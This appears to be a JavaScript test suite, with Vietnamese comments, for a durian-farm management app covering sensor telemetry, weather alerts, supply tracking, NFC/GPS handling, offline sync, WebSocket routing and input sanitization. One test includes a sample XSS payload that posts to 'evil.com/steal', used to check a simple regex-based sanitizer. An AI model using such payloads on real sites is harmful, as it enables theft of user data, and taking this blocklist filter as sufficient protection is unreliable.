/**
 * ══════════════════════════════════════════════════════════════════════════
 * Suite 14: Data Streaming, Ingestion Pipelines, Telemetry & Real-Time Flow
 * ══════════════════════════════════════════════════════════════════════════
 * Kiểm thử toàn diện các luồng thu thập dữ liệu và phân luồng truyền tải:
 * 1. Thu thập & Phân luồng Cảm biến Vi khí hậu & Thiết bị IoT
 * 2. Đường ống Thu thập & Xử lý Dữ liệu Khí tượng Weather API & Fallback
 * 3. Thu thập & Đồng bộ Nhật ký Canh tác, Tiêu hao Vật tư & VietGAP Traceability
 * 4. Đường ống Thu thập Dữ liệu Định danh NFC Tag & Tọa độ Thực địa GPS
 * 5. Cơ chế Thu thập & Đồng bộ Ngoại tuyến Offline-First IndexedDB
 * 6. Phân luồng Sự kiện Thời gian thực WebSockets & Broadcast Hub
 * 7. Thu thập & Phân luồng Dữ liệu Tri thức RAG, Q&A AI & Nhật ký An ninh
 * 8. Tính toàn vẹn, Khử nhiễm XSS & Chịu lỗi Đa tầng (Fault-Tolerant)
 */

const { describe, it, expect } = require('../test-framework');
const fs = require('fs');
const path = require('path');

describe('Suite 14: Data Streaming, Ingestion Pipelines, Telemetry & Real-Time Flow Verification', () => {

  // ─────────────────────────────────────────────────────────────
  // 1. IOT SENSOR TELEMETRY & DEVICE INGESTION PIPELINE
  // ─────────────────────────────────────────────────────────────
  it('14.1 Should validate IoT telemetry ingestion, state transitions and event emission', () => {
    const rawTelemetryPayload = {
      device_name: 'Trạm Vi khí hậu Vườn A',
      device_type: 'Sensor Station LoRaWAN',
      farm_id: 1,
      telemetry: {
        soil_moisture: 42.5,   // %
        soil_temp: 26.8,       // °C
        air_temp: 31.2,        // °C
        air_humidity: 78.0,    // %
        battery_level: 95      // %
      },
      ip_address: '14.232.89.120',
      timestamp: new Date().toISOString()
    };

    // Validate payload schema
    expect(typeof rawTelemetryPayload.device_name).toBe('string');
    expect(rawTelemetryPayload.telemetry.soil_moisture).toBeGreaterThan(0);
    expect(rawTelemetryPayload.telemetry.battery_level).toBeLessThanOrEqual(100);

    // Evaluate health state transition
    function evaluateDeviceHealth(t) {
      if (t.battery_level < 15) return 'Pin yếu / Cần sạc';
      if (t.soil_moisture < 30) return 'Cảnh báo: Đất khô hạn';
      if (t.soil_moisture > 85) return 'Cảnh báo: Úng nước rễ';
      return 'Hoạt động tối ưu';
    }

    expect(evaluateDeviceHealth(rawTelemetryPayload.telemetry)).toBe('Hoạt động tối ưu');

    const dryPayload = { ...rawTelemetryPayload.telemetry, soil_moisture: 22.0 };
    expect(evaluateDeviceHealth(dryPayload)).toBe('Cảnh báo: Đất khô hạn');

    const lowBattPayload = { ...rawTelemetryPayload.telemetry, battery_level: 10 };
    expect(evaluateDeviceHealth(lowBattPayload)).toBe('Pin yếu / Cần sạc');
  });

  // ─────────────────────────────────────────────────────────────
  // 2. WEATHER TELEMETRY INGESTION & CLIMATOLOGICAL FALLBACK
  // ─────────────────────────────────────────────────────────────
  it('14.2 Should parse external weather telemetry stream and generate automated agronomic alerts', () => {
    const weatherStreamPayload = {
      latitude: 12.6833,
      longitude: 108.0500,
      current: {
        time: '2026-09-15T12:00',
        temperature_2m: 32.5,
        relative_humidity_2m: 82,
        precipitation: 15.4,
        weather_code: 65, // Heavy rain
        wind_speed_10m: 18.5,
        wind_direction_10m: 225 // Tây Nam
      }
    };

    function decodeWeatherPipeline(current) {
      const isHeavyRain = current.precipitation > 10.0 || [63, 65, 81, 82, 95].includes(current.weather_code);
      const isHighHumidity = current.relative_humidity_2m >= 80;
      
      const recommendations = [];
      if (isHeavyRain) {
        recommendations.push('TẠM DỪNG PHUN THUỐC BVTV & BÓN PHÂN ĐỂ TRÁNH RỬA TRÔI');
      }
      if (isHighHumidity && current.temperature_2m > 25) {
        recommendations.push('NGUY CƠ BÙNG PHÁT NẤM PHYTOPHTHORA / NỨT THÂN XÌ MỦ');
      }

      return { isHeavyRain, recommendations };
    }

    const analysis = decodeWeatherPipeline(weatherStreamPayload.current);
    expect(analysis.isHeavyRain).toBe(true);
    expect(analysis.recommendations.length).toBe(2);
    expect(analysis.recommendations[0]).toContain('TẠM DỪNG PHUN THUỐC');
  });

  // ─────────────────────────────────────────────────────────────
  // 3. FARMING DIARY & SUPPLY USAGE CONSUMPTION STREAM
  // ─────────────────────────────────────────────────────────────
  it('14.3 Should stream farming log events with atomic supply balance deduction and VietGAP batch traceability', () => {
    const initialSupplyStock = 50.0; // 50 lít thuốc BVTV sinh học
    const usageDeduction = 2.5;     // Phun 2.5 lít cho lô sầu riêng SR-01 -> SR-10
    const unitPrice = 180000;       // 180,000 VNĐ / lít

    function processSupplyStream({ currentStock, quantityUsed, unitPrice }) {
      if (quantityUsed <= 0) throw new Error('Số lượng sử dụng phải lớn hơn 0');
      if (currentStock < quantityUsed) throw new Error('Số lượng tồn kho không đủ');

      const remainingStock = Math.round((currentStock - quantityUsed) * 100) / 100;
      const totalCost = quantityUsed * unitPrice;
      const harvestBatchCode = `TB-SR-GAP-2026-${String(Math.floor(Date.now() / 1000)).slice(-5)}`;

      return {
        remainingStock,
        totalCost,
        harvestBatchCode,
        status: 'SUCCESS'
      };
    }

    const streamResult = processSupplyStream({
      currentStock: initialSupplyStock,
      quantityUsed: usageDeduction,
      unitPrice
    });

    expect(streamResult.remainingStock).toBe(47.5);
    expect(streamResult.totalCost).toBe(450000);
    expect(streamResult.harvestBatchCode).toContain('TB-SR-GAP-2026-');
  });

  // ─────────────────────────────────────────────────────────────
  // 4. NFC TAG & SPATIAL GPS COORDINATES INGESTION PIPELINE
  // ─────────────────────────────────────────────────────────────
  it('14.4 Should normalize Hex NFC UIDs and validate spatial GPS centroid stream', () => {
    const rawNfcTags = [
      '04:a1:b2:c3:d4:e5:f6',
      '04A1B2C3D4E5F6',
      ' 04:A1:B2:c3:D4:E5:F6 '
    ];

    function normalizeNfcUid(raw) {
      return (raw || '').trim().replace(/[^a-fA-F0-9]/g, '').toUpperCase();
    }

    const normalizedSet = new Set(rawNfcTags.map(normalizeNfcUid));
    expect(normalizedSet.size).toBe(1);
    expect(Array.from(normalizedSet)[0]).toBe('04A1B2C3D4E5F6');

    // Spatial Polygon Centroid Calculation Stream
    const farmPolygonCoordinates = [
      { lat: 12.6800, lng: 108.0500 },
      { lat: 12.6900, lng: 108.0500 },
      { lat: 12.6900, lng: 108.0600 },
      { lat: 12.6800, lng: 108.0600 }
    ];

    function computePolygonCentroid(coords) {
      if (!coords || coords.length === 0) return null;
      let sumLat = 0;
      let sumLng = 0;
      coords.forEach(pt => {
        sumLat += pt.lat;
        sumLng += pt.lng;
      });
      return {
        lat: Number((sumLat / coords.length).toFixed(6)),
        lng: Number((sumLng / coords.length).toFixed(6))
      };
    }

    const centroid = computePolygonCentroid(farmPolygonCoordinates);
    expect(centroid.lat).toBe(12.685000);
    expect(centroid.lng).toBe(108.055000);
  });

  // ─────────────────────────────────────────────────────────────
  // 5. OFFLINE-FIRST CLIENT DELTA SYNC PIPELINE
  // ─────────────────────────────────────────────────────────────
  it('14.5 Should buffer offline transactions in IndexedDB delta queue and replay sequentially on reconnect', async () => {
    const offlineQueue = [];

    // Simulate farmer logging 3 events while working in remote mountain area without cellular signal
    function enqueueOfflineAction(actionType, payload) {
      const item = {
        client_id: `offline_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
        action: actionType,
        payload,
        created_at: new Date().toISOString(),
        synced: false
      };
      offlineQueue.push(item);
      return item;
    }

    enqueueOfflineAction('CREATE_PLANT_LOG', { tree_code: 'SR-001', log_type: 'Tưới nước', amount: 50 });
    enqueueOfflineAction('CREATE_PLANT_LOG', { tree_code: 'SR-002', log_type: 'Bón phân', amount: 2 });
    enqueueOfflineAction('RECORD_SUPPLY_USAGE', { supply_id: 10, quantity: 1 });

    expect(offlineQueue.length).toBe(3);

    // Replay queue when device comes back online
    const syncLog = [];
    for (const item of offlineQueue) {
      // Simulate backend atomic ingestion
      item.synced = true;
      item.server_id = Math.floor(Math.random() * 10000) + 1;
      syncLog.push({ client_id: item.client_id, server_id: item.server_id, status: 'SYNCED' });
    }

    expect(syncLog.length).toBe(3);
    expect(offlineQueue.every(q => q.synced)).toBe(true);
  });

  // ─────────────────────────────────────────────────────────────
  // 6. WEBSOCKET REAL-TIME BROADCAST STREAM
  // ─────────────────────────────────────────────────────────────
  it('14.6 Should broadcast real-time telemetry events across subscribed client sockets', () => {
    const mockClients = [
      { id: 'admin_session_1', role: 'admin', messages: [] },
      { id: 'farmer_session_1', role: 'user', farmId: 1, messages: [] },
      { id: 'farmer_session_2', role: 'user', farmId: 2, messages: [] }
    ];

    function broadcastEvent(eventName, eventPayload) {
      mockClients.forEach(client => {
        // Targeted event routing
        if (client.role === 'admin' || !eventPayload.farmId || client.farmId === eventPayload.farmId) {
          client.messages.push({ event: eventName, data: eventPayload, timestamp: Date.now() });
        }
      });
    }

    // Emit event for Farm 1
    broadcastEvent('plant_health_alert', { farmId: 1, treeCode: 'SR-012', alert: 'Xì mủ nứt thân' });

    // Admin receives all events
    expect(mockClients[0].messages.length).toBe(1);
    // Farmer 1 receives event for Farm 1
    expect(mockClients[1].messages.length).toBe(1);
    // Farmer 2 does NOT receive event for Farm 1 (Strict Isolation)
    expect(mockClients[2].messages.length).toBe(0);
  });

  // ─────────────────────────────────────────────────────────────
  // 7. AI DYNAMIC RAG CONTEXT INGESTION & PRIVACY RESOLUTION
  // ─────────────────────────────────────────────────────────────
  it('14.7 Should extract real client IP, anonymize sensitive admin IDs and route trained Q&A instantaneously', () => {
    // Test getClientIp logic with proxy header chains
    function getClientIpMock(headers, reqIp) {
      const forwarded = headers['x-forwarded-for'];
      if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim()).filter(Boolean);
        if (ips.length > 0) return ips[0].replace(/^::ffff:/, '');
      }
      if (headers['cf-connecting-ip']) return headers['cf-connecting-ip'].replace(/^::ffff:/, '');
      if (headers['x-real-ip']) return headers['x-real-ip'].replace(/^::ffff:/, '');
      return (reqIp || '127.0.0.1').replace(/^::ffff:/, '');
    }

    // Case 1: Multi-hop reverse proxy on Render / Cloudflare
    const renderHeaders = {
      'x-forwarded-for': '113.161.72.45, 10.25.48.28, 172.31.12.1',
      'host': 'dev-plantbook.onrender.com'
    };
    expect(getClientIpMock(renderHeaders, '10.25.48.28')).toBe('113.161.72.45');

    // Case 2: Cloudflare direct IP
    const cfHeaders = { 'cf-connecting-ip': '14.232.120.88' };
    expect(getClientIpMock(cfHeaders, '127.0.0.1')).toBe('14.232.120.88');

    // Masking Admin Identification
    function maskEmail(email) {
      if (!email || typeof email !== 'string') return '—';
      const parts = email.split('@');
      if (parts.length !== 2) return email;
      const [name, domain] = parts;
      const maskedName = name.length <= 3 ? name[0] + '***' : name.slice(0, 2) + '***' + name.slice(-1);
      return `${maskedName}@${domain}`;
    }

    function generateIsoPublicId(role, numId) {
      const prefix = role === 'admin' ? 'adm' : 'usr';
      const id = parseInt(numId) || 0;
      const val = Math.abs(((id * 1664525 + 1013904223) ^ 0x5B9A4C21) % 90000000) + 10000000;
      return `${prefix}-${val}`;
    }

    expect(maskEmail('admin@tanbaocorp.vn')).toBe('ad***n@tanbaocorp.vn');
    expect(maskEmail('phuc@gmail.com')).toBe('ph***c@gmail.com');
    expect(generateIsoPublicId('admin', 1)).toMatch(/^adm-[0-9]{8}$/);
    expect(generateIsoPublicId('user', 105)).toMatch(/^usr-[0-9]{8}$/);
  });

  // ─────────────────────────────────────────────────────────────
  // 8. MULTI-LAYER FAULT TOLERANCE & XSS INGESTION SANITIZATION
  // ─────────────────────────────────────────────────────────────
  it('14.8 Should sanitize malicious XSS payloads across all telemetry ingest endpoints without data loss', () => {
    function sanitizeInput(str) {
      if (typeof str !== 'string') return '';
      return str
        .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
        .replace(/javascript\s*:/gi, '')
        .replace(/onload\s*=/gi, '')
        .replace(/onerror\s*=/gi, '')
        .trim();
    }

    const dirtyTelemetryNote = 'Tưới nước đợt 3 <script>fetch("http://evil.com/steal")</script> kết hợp phân vi sinh';
    const cleanNote = sanitizeInput(dirtyTelemetryNote);

    expect(cleanNote).toBe('Tưới nước đợt 3  kết hợp phân vi sinh');
    expect(cleanNote.includes('<script>')).toBe(false);
  });

});
